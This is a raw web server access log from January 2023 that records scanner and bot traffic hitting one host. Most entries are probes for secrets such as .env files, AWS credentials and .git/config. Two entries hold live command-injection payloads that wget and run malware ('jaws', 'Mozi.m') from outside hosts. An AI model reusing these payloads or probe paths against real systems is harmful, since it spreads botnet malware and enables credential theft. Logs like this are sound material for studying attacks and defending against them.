185.254.196.223 - - [17/Jan/2023:14:25:08 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2620:96:e000:b0cc:e:2:7:3 - - [17/Jan/2023:14:29:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:7:3 - - [17/Jan/2023:14:29:32 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
167.71.164.238 - - [17/Jan/2023:14:34:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
179.43.177.242 - - [17/Jan/2023:15:00:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [17/Jan/2023:15:06:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
138.255.12.149 - - [17/Jan/2023:15:12:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.198.9 - - [17/Jan/2023:15:23:44 -0600] "GET /hudson HTTP/1.1" 301 238 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [17/Jan/2023:16:09:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
177.126.58.0 - - [17/Jan/2023:16:29:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:17:06:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [17/Jan/2023:17:25:17 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:17:25:18 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
156.193.186.228 - - [17/Jan/2023:17:39:54 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 291 "-" "Hello, world"
162.243.150.23 - - [17/Jan/2023:17:45:34 -0600] "GET /portal/redlion HTTP/1.1" 301 246 "-" "Mozilla/5.0 zgrab/0.x"
107.170.238.25 - - [17/Jan/2023:17:46:12 -0600] "GET /actuator/health HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
205.210.31.34 - - [17/Jan/2023:17:49:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [17/Jan/2023:18:05:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [17/Jan/2023:18:18:46 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.56.29.186 - - [17/Jan/2023:18:30:50 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [17/Jan/2023:18:30:50 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [17/Jan/2023:18:30:52 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.25.1"
2.57.122.173 - - [17/Jan/2023:19:06:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
38.128.66.69 - - [17/Jan/2023:19:07:56 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
143.110.222.166 - - [17/Jan/2023:19:09:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.1.248.42 - - [17/Jan/2023:19:52:28 -0600] "GET /admin/ HTTP/1.1" 301 238 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
90.150.202.255 - - [17/Jan/2023:20:00:43 -0600] "POST /HNAP1/ HTTP/1.0" 400 591 "-" "-"
143.110.222.166 - - [17/Jan/2023:20:13:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [17/Jan/2023:20:25:25 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:20:25:26 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:21:05:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.61.186.176 - - [17/Jan/2023:21:08:39 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
205.185.118.237 - - [17/Jan/2023:21:10:50 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
167.71.32.59 - - [17/Jan/2023:21:15:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.32.59 - - [17/Jan/2023:21:15:32 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.32.59 - - [17/Jan/2023:21:15:32 -0600] "\x16\x03\x01" 400 226 "-" "-"
179.43.177.242 - - [17/Jan/2023:21:31:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
18.236.200.255 - - [17/Jan/2023:21:35:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
45.227.254.54 - - [17/Jan/2023:21:36:59 -0600] "\x03" 400 226 "-" "-"
54.188.76.249 - - [17/Jan/2023:21:52:02 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.188.76.249 - - [17/Jan/2023:21:52:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
161.35.24.174 - - [17/Jan/2023:21:55:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.105.128.11 - - [17/Jan/2023:21:55:38 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [17/Jan/2023:22:06:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.189.182.234 - - [17/Jan/2023:22:26:49 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
145.255.72.10 - - [17/Jan/2023:22:50:25 -0600] "GET /.env HTTP/1.1" 301 245 "-" "-"
193.56.29.186 - - [17/Jan/2023:22:56:21 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [17/Jan/2023:22:56:22 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [17/Jan/2023:22:56:23 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.25.1"
45.12.253.180 - - [17/Jan/2023:23:00:13 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [17/Jan/2023:23:00:17 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
143.110.222.166 - - [17/Jan/2023:23:09:16 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
71.193.185.95 - - [17/Jan/2023:23:10:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:23:25:53 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:23:25:53 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.243.149.14 - - [17/Jan/2023:23:26:09 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
192.241.209.125 - - [17/Jan/2023:23:42:06 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
195.226.194.70 - - [17/Jan/2023:23:54:40 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [18/Jan/2023:00:07:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.61.101.14 - - [18/Jan/2023:00:17:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
2001:470:1:c84::191 - - [18/Jan/2023:00:47:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
2001:470:1:c84::182 - - [18/Jan/2023:00:51:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
2001:470:1:c84::18b - - [18/Jan/2023:00:51:51 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37"
40.77.167.41 - - [18/Jan/2023:01:06:52 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.57 - - [18/Jan/2023:01:06:55 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:01:07:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.210.31.32 - - [18/Jan/2023:01:18:32 -0600] "GET / HTTP/1.0" 301 233 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
27.40.103.223 - - [18/Jan/2023:01:23:55 -0600] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.40.103.223:47351/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 407 "-" "-"
205.185.118.237 - - [18/Jan/2023:01:31:37 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [18/Jan/2023:02:08:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [18/Jan/2023:02:21:42 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:02:21:43 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
14.29.231.172 - - [18/Jan/2023:02:51:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.255.167.130 - - [18/Jan/2023:03:04:52 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [18/Jan/2023:03:05:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
159.203.97.76 - - [18/Jan/2023:03:14:19 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:06 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:06 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:07 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:07 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:07 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:08 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:08 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:09 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:09 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:09 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:10 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:10 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:10 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:11 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:11 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:11 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:12 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:12 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:12 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [18/Jan/2023:03:31:13 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
113.125.140.19 - - [18/Jan/2023:03:51:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
205.210.31.43 - - [18/Jan/2023:03:55:41 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [18/Jan/2023:04:10:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [18/Jan/2023:04:13:49 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
87.236.176.155 - - [18/Jan/2023:04:16:45 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
156.96.154.202 - - [18/Jan/2023:04:22:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.77.127.183 - - [18/Jan/2023:04:28:08 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
128.14.209.170 - - [18/Jan/2023:04:59:21 -0600] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:05:09:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.134.134 - - [18/Jan/2023:05:20:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.35.18.107 - - [18/Jan/2023:05:25:02 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [18/Jan/2023:05:25:52 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:05:25:52 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.225.74.130 - - [18/Jan/2023:05:40:30 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "python-requests/2.28.1"
185.225.74.45 - - [18/Jan/2023:05:50:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:37 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [18/Jan/2023:05:50:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [18/Jan/2023:06:06:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.198.201.36 - - [18/Jan/2023:06:27:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
64.62.197.36 - - [18/Jan/2023:06:34:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
64.62.197.41 - - [18/Jan/2023:06:35:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
64.62.197.46 - - [18/Jan/2023:06:35:50 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
45.66.230.142 - - [18/Jan/2023:06:44:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
181.214.218.69 - - [18/Jan/2023:07:01:57 -0600] "POST /71624567 HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)"
